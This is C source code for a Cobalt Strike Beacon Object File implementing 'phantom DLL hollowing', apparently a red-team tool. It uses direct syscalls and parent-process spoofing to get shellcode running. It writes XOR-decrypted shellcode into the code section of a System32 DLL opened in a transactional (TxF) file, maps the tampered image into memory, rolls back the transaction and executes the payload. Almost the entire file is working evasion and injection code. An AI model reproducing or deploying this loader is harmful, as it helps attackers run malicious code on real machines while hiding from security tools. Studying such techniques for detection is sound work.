////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      PHANTOMDLLHOLLOWING BOF                                                                                       //
//                                                                                                                    //
//      POWERED BY: CobaltWhis[ers, SysWhispers2, InlineWhispers2                                                     //
//      AUTHOR: @Cerbersec                                                                                            //
//      PROPERTY OF: @NVISOsecurity                                                                                   //
//                                                                                                                    //
//      COMPILE WITH: gcc -o PhantomDLLHollowing.o -c PhantomDLLHollowing.c -masm=intel                               //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <TlHelp32.h>
#include "beacon.h"
#include "helpers.h"
#include "syscalls.c"
#include <stdint.h>

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                      IMPORTS                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$InitializeProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$UpdateProcThreadAttribute(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI void WINAPI KERNEL32$DeleteProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT NTAPI BOOL WINAPI NTDLL$RtlSetCurrentTransaction(HANDLE);
DECLSPEC_IMPORT NTAPI void WINAPI NTDLL$RtlInitUnicodeString(PUNICODE_STRING, PCWSTR);
DECLSPEC_IMPORT int MSVCRT$_stricmp(const char*, const char*);
DECLSPEC_IMPORT size_t MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT wchar_t* MSVCRT$wcscat(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT wchar_t* MSVCRT$wcscat_s(wchar_t*, size_t, const wchar_t*);
DECLSPEC_IMPORT void MSVCRT$free(void*);

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$FindFirstFileW(LPCWSTR, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$FindNextFileW(HANDLE, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleW(LPCWSTR);
DECLSPEC_IMPORT WINBASEAPI UINT WINAPI KERNEL32$GetSystemDirectoryW(LPWSTR, UINT);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$FindClose(HANDLE);


typedef void(*fnAddr)();

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                    PROC SPAWN                                                      //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

HANDLE GetParentHandle(char* parent)
{
    HANDLE hProcess;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if(KERNEL32$Process32First(snapshot, &entry) == TRUE)
    {
        while(KERNEL32$Process32Next(snapshot, &entry) == TRUE)
        {
            if(MSVCRT$_stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if(hProcess != INVALID_HANDLE_VALUE)
                {
                    NtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    NtClose(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}

PROCESS_INFORMATION Spawn(char* procPath, HANDLE parentHandle)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;

    myZeroMemory(&si, sizeof(si));
    myZeroMemory(&pi, sizeof(pi));

    KERNEL32$InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, attributeSize);
    KERNEL32$InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    //UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle, sizeof(HANDLE), NULL, NULL);

    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if(!KERNEL32$CreateProcessA(procPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi))
    {
    }

    KERNEL32$DeleteProcThreadAttributeList(si.lpAttributeList);
    NtClose(parentHandle);

    return pi;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                       HELPERS                                                      //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

IMAGE_SECTION_HEADER* GetContainerSecHdr(IMAGE_NT_HEADERS* pNtH, IMAGE_SECTION_HEADER* pInitialSecHeader, unsigned long qwRVA) {
    for(unsigned int i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* pCurrentSecHdr = pInitialSecHeader;
        unsigned int dwCurrentSecSize;

        pCurrentSecHdr += i;

        if(pCurrentSecHdr->Misc.VirtualSize > pCurrentSecHdr->SizeOfRawData) {
            dwCurrentSecSize = pCurrentSecHdr->Misc.VirtualSize;
        }
        else {
            dwCurrentSecSize = pCurrentSecHdr->SizeOfRawData;
        }

        if((qwRVA >= pCurrentSecHdr->VirtualAddress) && (qwRVA <= (pCurrentSecHdr->VirtualAddress + dwCurrentSecSize))) {
            return pCurrentSecHdr;
        }
    }

    return 0;
}

void* GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtH, IMAGE_SECTION_HEADER* pInitialSecHdrs, unsigned long qwRVA) {
    IMAGE_SECTION_HEADER * pContainSecHdr;

    if((pContainSecHdr = GetContainerSecHdr(pNtH, pInitialSecHdrs, qwRVA)) != 0) {
        unsigned int dwOffset = (qwRVA - pContainSecHdr->VirtualAddress);

        if(dwOffset < pContainSecHdr->SizeOfRawData) {
            return (uint8_t*)(pPeBuf + pContainSecHdr->PointerToRawData + dwOffset);
        }
    }

    return 0;
}

//TODO: check if unsigned char* -> uint8_t*
BOOL CheckRelocRange(uint8_t* pRelocBuf, /*unsigned int dwRelocBufSize,*/ unsigned int dwStartRVA, unsigned int dwEndRVA) {
    IMAGE_BASE_RELOCATION* pCurrentRelocBlock;
    unsigned int dwRelocBufOffset, i;
    BOOL bWithinRange = FALSE;

    for(pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)pRelocBuf, i = 0, dwRelocBufOffset = 0; pCurrentRelocBlock->SizeOfBlock; i++) {
        unsigned int dwNumBlocks = ((pCurrentRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(unsigned short));
        unsigned short* pwCurrentRelocEntry = (unsigned short*)((uint8_t*)pCurrentRelocBlock + sizeof(IMAGE_BASE_RELOCATION));

        for(unsigned int j = 0; j < dwNumBlocks; j++, pwCurrentRelocEntry++) {
            if(((*pwCurrentRelocEntry >> 12) & RELOC_FLAG_ARCH_AGNOSTIC) == RELOC_FLAG_ARCH_AGNOSTIC) {
                unsigned int dwRelocEntryRefLocRva = (pCurrentRelocBlock->VirtualAddress + (*pwCurrentRelocEntry & 0x0FFF));

                if(dwRelocEntryRefLocRva >= dwStartRVA && dwRelocEntryRefLocRva < dwEndRVA) {
                    bWithinRange = TRUE;
                }
            }
        }
        dwRelocBufOffset += pCurrentRelocBlock->SizeOfBlock;
        pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)((uint8_t*)pCurrentRelocBlock + pCurrentRelocBlock->SizeOfBlock);
    }
    return bWithinRange;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                        HOLLOW                                                      //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

BOOL HollowDLL(uint8_t** ppMapBuf, unsigned long* pqwMapBufSize, char* shellcode, unsigned int payloadSize, uint8_t** ppMappedCode) {
    //locate DLL in architecture appropriate system folder which has a sufficient image size to hollow for allocation
    //WIN32_FIND_DATAW Wfd = { 0 };
    WIN32_FIND_DATAW Wfd;
    //wchar_t SearchFilePath[MAX_PATH] = { 0 };
    //wchar_t SysDir[MAX_PATH] = { 0 };
    HANDLE hFind;
    BOOL bMapped = FALSE;

    //TODO: ommit GetSystemDirectoryW by hardcoding x64 path
    //KERNEL32$GetSystemDirectoryW(SysDir, MAX_PATH);
    //MSVCRT$wcscat_s(SearchFilePath, MAX_PATH, SysDir);
    //MSVCRT$wcscat_s(SearchFilePath, MAX_PATH, L"\\*.dll");
    wchar_t* SearchFilePath = L"C:\\Windows\\System32\\*.dll";

    if((hFind = KERNEL32$FindFirstFileW(SearchFilePath, &Wfd)) != INVALID_HANDLE_VALUE) {
        do {
            if(KERNEL32$GetModuleHandleW(Wfd.cFileName) == 0) {
                HANDLE hFile = INVALID_HANDLE_VALUE;
                HANDLE hTransaction = INVALID_HANDLE_VALUE;
                //wchar_t FilePath[MAX_PATH] = { 0 };
                NTSTATUS status;
                uint8_t* pFileBuf = 0;

                //TODO: ommit getSystemDirectoryW by hardcoding x64 path
                //MSVCRT$wcscat_s(FilePath, MAX_PATH, L"\\??\\");
                //MSVCRT$wcscat_s(FilePath, MAX_PATH, SysDir);
                //MSVCRT$wcscat_s(FilePath, MAX_PATH, L"\\");
                //MSVCRT$wcscat_s(FilePath, MAX_PATH, Wfd.cFileName);
                wchar_t FilePath[200] = L"\\??\\C:\\Windows\\System32\\";
                MSVCRT$wcscat(FilePath, Wfd.cFileName);

                //TODO: debug
                //wprintf(L"%ls \n", FilePath);

                //read DLL to memory using TxF
                OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
                status = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL);

                if (status == STATUS_SUCCESS) {

                    NTDLL$RtlSetCurrentTransaction(hTransaction);

                    OBJECT_ATTRIBUTES oa;
                    UNICODE_STRING filename;
                    IO_STATUS_BLOCK osb;

                    NTDLL$RtlInitUnicodeString(&filename, FilePath);

                    myZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
                    InitializeObjectAttributes(&oa, &filename, OBJ_CASE_INSENSITIVE, NULL, NULL);

                    //open file transacted
                    status = NtCreateFile(&hFile, GENERIC_READ | FILE_WRITE_DATA | SYNCHRONIZE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

                    //hFile = CreateFileTransactedW(FilePath, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
                    if(status == STATUS_SUCCESS) {
                    //if(hFile != INVALID_HANDLE_VALUE) {
                        NTDLL$RtlSetCurrentTransaction(hTransaction);

                        unsigned int dwFileSize = KERNEL32$GetFileSize(hFile, 0);
                        unsigned int dwBytesRead = 0;

                        //TODO: possible memset issue?
                        pFileBuf = MSVCRT$malloc(dwFileSize);

                        IO_STATUS_BLOCK osb2;
                        //read file transacted
                        status = NtReadFile(hFile, NULL, NULL, NULL, &osb2, pFileBuf, dwFileSize, 0, NULL);
                        if(status == STATUS_SUCCESS) {
                            KERNEL32$SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

                            IMAGE_DOS_HEADER *pDosH = (IMAGE_DOS_HEADER *) pFileBuf;
                            IMAGE_NT_HEADERS *pNtH = (IMAGE_NT_HEADERS * )(pFileBuf + pDosH->e_lfanew);
                            IMAGE_SECTION_HEADER *pSectHdrs = (IMAGE_SECTION_HEADER * )((uint8_t*) &pNtH->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));

                            //check if NT header is valid
                            if (pNtH->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
                                //check .text section size
                                if (payloadSize < pNtH->OptionalHeader.SizeOfImage && (MSVCRT$_stricmp((char*) pSectHdrs->Name, ".text") == 0 && payloadSize < pSectHdrs->Misc.VirtualSize)) {
                                    //found DLL with sufficient image size
                                    BeaconPrintf(CALLBACK_OUTPUT,"[+] Found a suitable DLL: %ws - image size: %lu - .text size: %lu", Wfd.cFileName, pNtH->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);

                                    unsigned int dwCodeRva = 0;
                                    unsigned int dwBytesWritten = 0;

                                    //wipe data directories that conflict with the code section
                                    for(unsigned int i; i < pNtH->OptionalHeader.NumberOfRvaAndSizes; i++) {
                                        if(pNtH->OptionalHeader.DataDirectory[i].VirtualAddress >= pSectHdrs->VirtualAddress && pNtH->OptionalHeader.DataDirectory[i].VirtualAddress < (pSectHdrs->VirtualAddress + pSectHdrs->Misc.VirtualSize)) {
                                            pNtH->OptionalHeader.DataDirectory[i].VirtualAddress = 0;
                                            pNtH->OptionalHeader.DataDirectory[i].Size = 0;
                                        }
                                    }

                                    //find a range free of relocations large enough to accommodate the code
                                    BOOL bRangeFound = FALSE;
                                    uint8_t* pRelocBuf = (uint8_t*)GetPAFromRVA(pFileBuf, pNtH, pSectHdrs, pNtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

                                    if(pRelocBuf != 0) {
                                        for(dwCodeRva = 0; !bRangeFound && dwCodeRva < pSectHdrs->Misc.VirtualSize; dwCodeRva += payloadSize) {
                                            if(!CheckRelocRange(pRelocBuf, /*pNtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size,*/ pSectHdrs->VirtualAddress + dwCodeRva, pSectHdrs->VirtualAddress + dwCodeRva + payloadSize)) {
                                                bRangeFound = TRUE;
                                                break;
                                            }
                                        }

                                        if(bRangeFound) {
                                            BeaconPrintf(CALLBACK_OUTPUT,"[+] Found a blank region with code section to accommodate payload at 0x%x", dwCodeRva);
                                        }
                                        else {
                                            BeaconPrintf(CALLBACK_ERROR, "Failed to identify a blank region large enough to accommodate payload");
                                        }

                                        myMemcpy(pFileBuf + pSectHdrs->PointerToRawData + dwCodeRva, shellcode, payloadSize);

                                        NTDLL$RtlSetCurrentTransaction(hTransaction);

                                        IO_STATUS_BLOCK osb3;
                                        status = NtWriteFile(hFile, NULL, NULL, NULL, &osb3, pFileBuf, dwFileSize, 0, NULL);
                                        if(status == STATUS_SUCCESS) {
                                            BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully modified TxF file content");
                                        }
                                    }
                                    else {
                                        BeaconPrintf(CALLBACK_ERROR, "No relocation directory present");
                                    }

                                    HANDLE hSection = NULL;
                                    status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);

                                    //TODO: rollback?
                                    NtRollbackTransaction(hTransaction, TRUE);

                                    if(status == STATUS_SUCCESS) {
                                        *pqwMapBufSize = 0;
                                        //TODO: map to remote process? -> pi.hProcess
                                        status = NtMapViewOfSection(hSection, KERNEL32$GetCurrentProcess(), (void**)ppMapBuf, 0, 0, NULL, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY);

                                        if(status == STATUS_SUCCESS) {
                                            if(*pqwMapBufSize >= pNtH->OptionalHeader.SizeOfImage) {
                                                BeaconPrintf(CALLBACK_OUTPUT, "[+] %ws - mapped size: %lu", Wfd.cFileName, *pqwMapBufSize);
                                                *ppMappedCode = *ppMapBuf + pSectHdrs->VirtualAddress + dwCodeRva;

                                                bMapped = TRUE;
                                            }
                                        }
                                        else {
                                            BeaconPrintf(CALLBACK_ERROR, "Failed to create mapping of section: %lx", status);
                                        }
                                    }
                                    else {
                                        BeaconPrintf(CALLBACK_ERROR, "Failed to create section: %lx", status);
                                    }
                                }
                            }
                        }
                        else {
                            BeaconPrintf(CALLBACK_ERROR, "Failed to read file: %lx", status);
                        }
                        //TODO: validate
                        if(pFileBuf != NULL) {
                            //delete[] pFileBuf;
                            MSVCRT$free(pFileBuf);
                        }
                        if(hFile != INVALID_HANDLE_VALUE) {
                            NtClose(hFile);
                        }
                        if(hTransaction != INVALID_HANDLE_VALUE) {
                            NtClose(hTransaction);
                        }
                    }
                    else {
                        //TODO: debug
                        //printf("Failed to open file: %lx\n", status);
                    }
                }
                else {
                    BeaconPrintf(CALLBACK_ERROR,"Failed to create transaction: %lx", status);
                }
            }
        } while(!bMapped && KERNEL32$FindNextFileW(hFind, &Wfd));
        KERNEL32$FindClose(hFind); //TODO: NtClose?
    }

    KERNEL32$FindClose(hFind); //TODO: NtClose?
    return bMapped;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                         MAIN                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void go(char* args, int alen) {
    if(8 != sizeof(void*))
    {
        BeaconPrintf(CALLBACK_ERROR, "Not a 64 bit system");
        return;
    }

    /*==================================*/
    /*              PAYLOAD             */
    /*==================================*/

    SIZE_T shellcode_size;
    int payload_size;
    datap parser;

    BeaconDataParse(&parser, args, alen);

    char* parent = BeaconDataExtract(&parser, NULL);
    char* process = BeaconDataExtract(&parser, NULL);
    char* shellcode = BeaconDataExtract(&parser, &payload_size);

    if(payload_size == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Payload too small: %d", payload_size);
        return;
    }
    else
    {
        shellcode_size = payload_size + 1;
    }

    shellcode = xordecrypt(shellcode, shellcode_size);

    /*==================================*/
    /*               SPAWN              */
    /*==================================*/

    //PROCESS_INFORMATION pi = Spawn(process, GetParentHandle(parent));

    /*==================================*/
    /*              HOLLOW              */
    /*==================================*/

    uint8_t *pMapBuf = NULL;
    uint8_t *pMappedCode = NULL;
    unsigned long qwMapBufSize;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Hollowing...");

    if (HollowDLL(&pMapBuf, &qwMapBufSize, shellcode, shellcode_size, &pMappedCode)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully mapped an image to hollow at 0x%p (size:%lu bytes)", pMapBuf, qwMapBufSize);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling 0x%p...", pMappedCode);
        ((fnAddr) pMappedCode)();
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Hollowing failed");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "done");
}